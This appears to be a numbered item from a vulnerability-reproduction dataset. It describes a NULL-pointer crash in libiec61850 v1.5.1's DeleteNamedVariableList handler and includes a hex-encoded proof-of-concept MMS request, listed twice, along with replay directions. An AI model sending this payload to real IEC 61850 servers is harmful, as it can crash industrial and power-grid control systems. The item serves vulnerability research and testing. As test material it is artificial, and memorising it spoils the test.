@@ -1,0 +1,10 @@
+Number: 542
+
+Summarize:
+libiec61850 v1.5.1 is reported to crash in `mmsServer_handleDeleteNamedVariableListRequest` in `mms_named_variable_list_service.c`. The report says certain requests can leave `request->listOfVariableListName` empty/null, and the function then reads `request->listOfVariableListName->list.count` without first validating that field. The demonstrated result is an invalid memory read and a Segmentation Fault (SEGV).
+
+Reproduce:
+No build configuration, example program, or command sequence is provided. The document supplies only a PoC request as `poc.bin`: `0300 0044 02f0 8001 0001 0061 3730 3502 0100 a030 a02e 0201 03ad 2980 0100 8224 8000 a120 1a11 7369 6d70 6c65 494f 4765 6e65 7269 6349 4f1a 0b4c 4c4e 3024 4576 656e 7473`. Replay/process that request against libiec61850 v1.5.1 so it reaches `mmsServer_handleDeleteNamedVariableListRequest()`. The reported outcome is a Segmentation Fault (SEGV); under GDB, the crash occurs when dereferencing `request->listOfVariableListName->list.count`.
+
+Payload:
+03 00 00 44 02 f0 80 01 00 01 00 61 37 30 35 02 01 00 a0 30 a0 2e 02 01 03 ad 29 80 01 00 82 24 80 00 a1 20 1a 11 73 69 6d 70 6c 65 49 4f 47 65 6e 65 72 69 63 49 4f 1a 0b 4c 4c 4e 30 24 45 76 65 6e 74 73
